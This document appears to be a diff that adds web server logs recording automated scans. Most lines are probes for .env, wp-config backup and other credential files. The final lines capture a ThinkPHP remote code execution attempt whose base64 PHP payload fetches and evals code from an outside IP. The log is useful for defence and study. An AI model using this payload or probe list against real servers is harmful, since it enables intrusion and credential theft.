+Not Found: /.env.save
+Not Found: /.env.stage
+Not Found: /.env.test
+Not Found: /.env.test.local
+Not Found: /.env.local
+Not Found: /.env.production
+Not Found: /.env.staging
+Not Found: /backup/.env
+Not Found: /backup/.env.local
+Not Found: /backup/.env.production
+Not Found: /backup/.env.staging
+Not Found: /public/.env
+Not Found: /public/.env.local
+Not Found: /public/.env.production
+Not Found: /public/.env.staging
+Not Found: /laravel/.env
+Not Found: /laravel/.env.local
+Not Found: /laravel/.env.production
+Not Found: /laravel/.env.staging
+Not Found: /laravel/core/.env
+Not Found: /laravel/core/.env.local
+Not Found: /laravel/core/.env.production
+Not Found: /laravel/core/.env.staging
+Not Found: /beta/.env
+Not Found: /beta/.env.local
+Not Found: /beta/.env.production
+Not Found: /beta/.env.staging
+Not Found: /live/.env
+Not Found: /live/.env.local
+Not Found: /live/.env.production
+Not Found: /live/.env.staging
+Not Found: /demo/.env
+Not Found: /demo/.env.local
+Not Found: /demo/.env.production
+Not Found: /demo/.env.staging
+Not Found: /test/.env
+Not Found: /test/.env.local
+Not Found: /test/.env.production
+Not Found: /test/.env.staging
+Not Found: /kyc/.env
+Not Found: /kyc/.env.local
+Not Found: /kyc/.env.production
+Not Found: /kyc/.env.staging
+Not Found: /client/.env
+Not Found: /client/.env.local
+Not Found: /client/.env.production
+Not Found: /client/.env.staging
+Not Found: /user/.env
+Not Found: /user/.env.local
+Not Found: /user/.env.staging
+Not Found: /api/.env
+Not Found: /api/.env.local
+Not Found: /api/.env.staging
+Not Found: /api/.env.production
+Not Found: /apis/.env
+Not Found: /apis/.env.local
+Not Found: /apis/.env.staging
+Not Found: /apis/.env.production
+Not Found: /backend/.env
+Not Found: /backend/.env.local
+Not Found: /backend/.env.staging
+Not Found: /backend/.env.production
+Not Found: /server/.env
+Not Found: /server/.env.local
+Not Found: /server/.env.staging
+Not Found: /server/.env.production
+Not Found: /app/.env
+Not Found: /app/.env.local
+Not Found: /app/.env.staging
+Not Found: /app/.env.production
+Not Found: /project/.env
+Not Found: /project/.env.local
+Not Found: /project/.env.staging
+Not Found: /project/.env.production
+Not Found: /cron/.env
+Not Found: /cron/.env.local
+Not Found: /cron/.env.staging
+Not Found: /cron/.env.production
+Not Found: /crm/.env
+Not Found: /crm/.env.local
+Not Found: /crm/.env.staging
+Not Found: /crm/.env.production
+Not Found: /current/.env
+Not Found: /current/.env.local
+Not Found: /current/.env.staging
+Not Found: /current/.env.production
+Not Found: /dev/.env
+Not Found: /dev/.env.local
+Not Found: /dev/.env.staging
+Not Found: /dev/.env.production
+Not Found: /develop/.env
+Not Found: /develop/.env.local
+Not Found: /develop/.env.staging
+Not Found: /develop/.env.production
+Not Found: /development/.env
+Not Found: /development/.env.local
+Not Found: /development/.env.staging
+Not Found: /development/.env.production
+Not Found: /prod/.env
+Not Found: /prod/.env.local
+Not Found: /prod/.env.staging
+Not Found: /prod/.env.production
+Not Found: /product/.env
+Not Found: /product/.env.local
+Not Found: /product/.env.staging
+Not Found: /product/.env.production
+Not Found: /production/.env
+Not Found: /production/.env.local
+Not Found: /production/.env.staging
+Not Found: /production/.env.production
+Not Found: /portal/.env
+Not Found: /portal/.env.local
+Not Found: /portal/.env.staging
+Not Found: /portal/.env.production
+Not Found: /qa/.env
+Not Found: /qa/.env.local
+Not Found: /qa/.env.staging
+Not Found: /qa/.env.production
+Not Found: /stg/.env
+Not Found: /stg/.env.local
+Not Found: /stg/.env.staging
+Not Found: /stg/.env.production
+Not Found: /staging/.env
+Not Found: /staging/.env.local
+Not Found: /staging/.env.staging
+Not Found: /staging/.env.production
+Not Found: /service/.env
+Not Found: /service/.env.local
+Not Found: /robots.txt
+Not Found: /service/.env.staging
+Not Found: /.well-known/assetlinks.json
+Not Found: /service/.env.production
+Not Found: /services/.env
+Not Found: /services/.env.local
+Not Found: /services/.env.staging
+Not Found: /services/.env.production
+Not Found: /storage/.env
+Not Found: /storage/.env.local
+Not Found: /storage/.env.staging
+Not Found: /storage/.env.production
+Not Found: /old/.env
+Not Found: /old/.env.local
+Not Found: /old/.env.staging
+Not Found: /old/.env.production
+Not Found: /new/.env
+Not Found: /new/.env.local
+Not Found: /new/.env.staging
+Not Found: /new/.env.production
+Not Found: /web/.env
+Not Found: /web/.env.local
+Not Found: /web/.env.staging
+Not Found: /web/.env.production
+Not Found: /website/.env
+Not Found: /website/.env.local
+Not Found: /website/.env.staging
+Not Found: /website/.env.production
+Not Found: /market/.env
+Not Found: /market/.env.local
+Not Found: /market/.env.staging
+Not Found: /market/.env.production
+Not Found: /marketing/.env
+Not Found: /marketing/.env.local
+Not Found: /marketing/.env.staging
+Not Found: /marketing/.env.production
+Not Found: /shop/.env
+Not Found: /shop/.env.local
+Not Found: /shop/.env.staging
+Not Found: /shop/.env.production
+Not Found: /public_html/.env
+Not Found: /public_html/.env.local
+Not Found: /public_html/.env.staging
+Not Found: /public_html/.env.production
+Not Found: /xampp/.env
+Not Found: /xampp/.env.local
+Not Found: /xampp/.env.staging
+Not Found: /xampp/.env.production
+Not Found: /api/.env
+Not Found: /.docker/.env
+Not Found: /.docker/laravel/app/.env
+Not Found: /env.backup
+Not Found: /.environment
+Not Found: /.envrc
+Not Found: /.envs
+Not Found: /.env~
+Not Found: /.gitlab-ci/.env
+Not Found: /.vscode/.env
+Not Found: /mailer/.env
+Not Found: /twitter/.env
+Not Found: /.env.development.local
+Not Found: /wp-config.php.bak
+Not Found: /wp-config.php.old
+Not Found: /wp-config.php-backup
+Not Found: /.wp-config.php.swo
+Not Found: /wp-config.php.swp
+Not Found: /.wp-config.swp
+Not Found: /backup.wp-config.php
+Not Found: /wp-config
+Not Found: /wp-config - Copy.php
+Not Found: /wp-config copy.php
+Not Found: /wp-config_backup
+Not Found: /wp-config_good
+Not Found: /wp-config-backup
+Not Found: /wp-config-backup.php
+Not Found: /wp-config-backup.txt
+Not Found: /wp-config-backup1.txt
+Not Found: /wp-config-good
+Not Found: /wp-config-sample.php
+Not Found: /wp-config-sample.php.bak
+Not Found: /wp-config-sample.php~
+Not Found: /wp-config.backup
+Not Found: /wp-config.bak
+Not Found: /wp-config.bkp
+Not Found: /wp-config.cfg
+Not Found: /wp-config.conf
+Not Found: /wp-config.data
+Not Found: /wp-config.dump
+Not Found: /wp-config.good
+Not Found: /wp-config.htm
+Not Found: /wp-config.html
+Not Found: /wp-config.inc
+Not Found: /wp-config.local.php
+Not Found: /wp-config.old
+Not Found: /wp-config.old.old
+Not Found: /wp-config.ORG
+Not Found: /wp-config.orig
+Not Found: /wp-config.original
+Not Found: /wp-config.php
+Not Found: /wp-config.php_
+Not Found: /wp-config.php__
+Not Found: /wp-config.php______
+Not Found: /wp-config.php__olds
+Not Found: /wp-config.php_1
+Not Found: /wp-config.php_backup
+Not Found: /wp-config.php_bak
+Not Found: /wp-config.php_bk
+Not Found: /wp-config.php_new
+Not Found: /wp-config.php_old
+Not Found: /wp-config.php_old2017
+Not Found: /wp-config.php_old2018
+Not Found: /wp-config.php_old2019
+Not Found: /wp-config.php_old2020
+Not Found: /wp-config.php_orig
+Not Found: /wp-config.php_original
+Not Found: /wp-config.php-
+Not Found: /wp-config.php-backup
+Not Found: /wp-config.php-bak
+Not Found: /wp-config.php-n
+Not Found: /wp-config.php-o
+Not Found: /wp-config.php-old
+Not Found: /wp-config.php-original
+Not Found: /wp-config.php-save
+Not Found: /wp-config.php-work
+Not Found: /wp-config.php.0
+Not Found: /wp-config.php.1
+Not Found: /wp-config.php.2
+Not Found: /wp-config.php.3
+Not Found: /wp-config.php.4
+Not Found: /wp-config.php.5
+Not Found: /wp-config.php.6
+Not Found: /wp-config.php.7
+Not Found: /wp-config.php.8
+Not Found: /wp-config.php.9
+Not Found: /wp-config.php.a
+Not Found: /wp-config.php.aws
+Not Found: /wp-config.php.azure
+Not Found: /wp-config.php.b
+Not Found: /wp-config.php.backup
+Not Found: /wp-config.php.backup.txt
+Not Found: /wp-config.php.bak
+Not Found: /wp-config.php.bak1
+Not Found: /wp-config.php.bk
+Not Found: /wp-config.php.bkp
+Not Found: /wp-config.php.c
+Not Found: /wp-config.php.com
+Not Found: /wp-config.php.cust
+Not Found: /wp-config.php.dev
+Not Found: /wp-config.php.disabled
+Not Found: /wp-config.php.dist
+Not Found: /wp-config.php.dump
+Not Found: /wp-config.php.html
+Not Found: /wp-config.php.in
+Not Found: /wp-config.php.inc
+Not Found: /wp-config.php.local
+Not Found: /wp-config.php.maj
+Not Found: /wp-config.php.new
+Not Found: /wp-config.php.old
+Not Found: /wp-config.php.org
+Not Found: /wp-config.php.orig
+Not Found: /wp-config.php.original
+Not Found: /wp-config.php.php-bak
+Not Found: /wp-config.php.prod
+Not Found: /wp-config.php.production
+Not Found: /wp-config.php.sample
+Not Found: /wp-config.php.save
+Not Found: /wp-config.php.save.1
+Not Found: /wp-config.php.stage
+Not Found: /wp-config.php.staging
+Not Found: /wp-config.php.swn
+Not Found: /wp-config.php.swo
+Not Found: /wp-config.php.swp
+Not Found: /wp-config.php.tar
+Not Found: /wp-config.php.temp
+Not Found: /wp-config.php.tmp
+Not Found: /wp-config.php.txt
+Not Found: /wp-config.php.uk
+Not Found: /wp-config.php.us
+Not Found: /wp-config.php=
+Not Found: /wp-config.php~
+Not Found: /wp-config.php~~~
+Not Found: /wp-config.php1
+Not Found: /wp-config.phpa
+Not Found: /wp-config.phpb
+Not Found: /wp-config.phpbak
+Not Found: /wp-config.phpc
+Not Found: /wp-config.phpd
+Not Found: /wp-config.phpn
+Not Found: /wp-config.phpnew
+Not Found: /wp-config.phpold
+Not Found: /wp-config.phporiginal
+Not Found: /wp-config.phptmp
+Not Found: /wp-config.prod.php.txt
+Not Found: /wp-config.save
+Not Found: /wp-config.tar
+Not Found: /wp-config.temp
+Not Found: /wp-config.txt
+Not Found: /wp-config.zip
+Not Found: /wp-config~
+Not Found: /wp-configbak
+Not Found: /debug/default/view
+Not Found: /frontend_dev.php/$
+Not Found: /index js
+Not Found: /config.js
+Not Found: /config/config.js
+Not Found: /js/config.js
+Not Found: /js/envConfig.js
+Not Found: /env.config.js
+Not Found: /env.js
+Not Found: /app/config.yml
+Not Found: /app/config/parameters.yml
+Not Found: /config/secrets.yml
+Not Found: /secrets.yml
+Not Found: /database.yml
+[03/Feb/2024 15:25:09] code 400, message Bad request syntax ('MGLNDD_3.36.81.50_8000')
+[03/Feb/2024 15:25:09] "MGLNDD_3.36.81.50_8000" 400 -
+[03/Feb/2024 15:25:37] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+[03/Feb/2024 15:25:37] "    c                           " 400 -
+Not Found: /actuator/gateway/routes
+Not Found: /Core/Skin/Login.aspx
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /.DS_Store
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /Core/Skin/Login.aspx
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+[03/Feb/2024 19:09:38] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ºúT\\p°úÓ'ñÑÒKËÀh«\x98·'Öø\x83·,|æÈj¼\x06X\x00\x00\x1aÀ/À+À\x11À\x07À\x13À")
+[03/Feb/2024 19:09:38] You're accessing the development server over HTTPS, but it only supports HTTP.
+[03/Feb/2024 19:09:39] code 400, message Bad request version ('À\x14À')
+[03/Feb/2024 19:09:39] You're accessing the development server over HTTPS, but it only supports HTTP.
+[03/Feb/2024 19:09:39] "GET / HTTP/1.1" 200 3786
+[03/Feb/2024 19:09:40] code 400, message Bad request version ('À\x14À')
+[03/Feb/2024 19:09:40] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: /manager/html
+[03/Feb/2024 19:39:27] "GET / HTTP/1.1" 200 3786
+Not Found: /dqgqoeCXckuwPtxov
+Not Found: /dqgqoeCXckuwPtxov
+Not Found: /Core/Skin/Login.aspx
+[03/Feb/2024 20:54:22] code 400, message Bad request version ('À\x14À')
+[03/Feb/2024 20:54:22] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /.vscode/sftp.json
+[03/Feb/2024 22:07:55] "GET / HTTP/1.1" 200 3786
+Not Found: /autodiscover/autodiscover.json
+[03/Feb/2024 22:21:30] code 400, message Bad request version ('À\x14À')
+[03/Feb/2024 22:21:30] You're accessing the development server over HTTPS, but it only supports HTTP.
+[03/Feb/2024 22:29:36] "GET / HTTP/1.1" 200 3786
+[03/Feb/2024 22:42:01] "GET / HTTP/1.1" 200 3786
+Not Found: /Core/Skin/Login.aspx
+Not Found: /.git/config
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: //.env
+[04/Feb/2024 00:16:01] "GET / HTTP/1.1" 200 3786
+Not Found: /Core/Skin/Login.aspx
+[04/Feb/2024 01:27:39,600] - Broken pipe from ('199.45.155.49', 37076)
+[04/Feb/2024 01:27:42] "GET / HTTP/1.1" 200 3786
+[04/Feb/2024 01:27:42,960] - Broken pipe from ('199.45.155.49', 37104)
+[04/Feb/2024 01:27:47] "GET / HTTP/1.1" 200 3786
+[04/Feb/2024 01:27:47] code 505, message Invalid HTTP version (2.0)
+[04/Feb/2024 01:27:47] "PRI * HTTP/2.0" 505 -
+Not Found: /favicon.ico
+[04/Feb/2024 01:27:47] "GET /favicon.ico HTTP/1.1" 404 5223
+Not Found: //wp-includes/ID3/license.txt
+Not Found: //feed/
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //2021/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: /.env
+Not Found: /.git/config
+Not Found: /index.php
+Not Found: /index.php
+[2024-02-04 02:48:25 +0000] [397804] [WARNING] Invalid request from ip=: Invalid HTTP Version: 'hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=eval&vars[1][]=\'eval(base64_decode("aWYoZmlsdGVyX3ZhcihpbmlfZ2V0KCJhbGxvd191cmxfZm9wZW4iKSxGSUxURVJfVkFMSURBVEVfQk9PTEVBTikpe2V2YWwoZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly85My4xMjMuMzkuNzYveCIpKTt9ZWxzZXskaD1jdXJsX2luaXQoImh0dHA6Ly85My4xMjMuMzkuNzYveCIpO2N1cmxfc2V0b3B0KCRoLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7Y3VybF9zZXRvcHQoJGgsQ1VSTE9QVF9IRUFERVIsMCk7ZXZhbChjdXJsX2V4ZWMoJGgpKTtjdXJsX2Nsb3NlKCRoKTt9"));\' HTTP/1.0'
+[2024-02-04 02:48:25 +0000] [397804] [WARNING] Invalid request from ip=: Invalid HTTP Version: 'hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=eval&vars[1][]=\'eval(base64_decode("aWYoZmlsdGVyX3ZhcihpbmlfZ2V0KCJhbGxvd191cmxfZm9wZW4iKSxGSUxURVJfVkFMSURBVEVfQk9PTEVBTikpe2V2YWwoZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly85My4xMjMuMzkuNzYveCIpKTt9ZWxzZXskaD1jdXJsX2luaXQoImh0dHA6Ly85My4xMjMuMzkuNzYveCIpO2N1cmxfc2V0b3B0KCRoLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7Y3VybF9zZXRvcHQoJGgsQ1VSTE9QVF9IRUFERVIsMCk7ZXZhbChjdXJsX2V4ZWMoJGgpKTtjdXJsX2Nsb3NlKCRoKTt9"));\' HTTP/1.0'
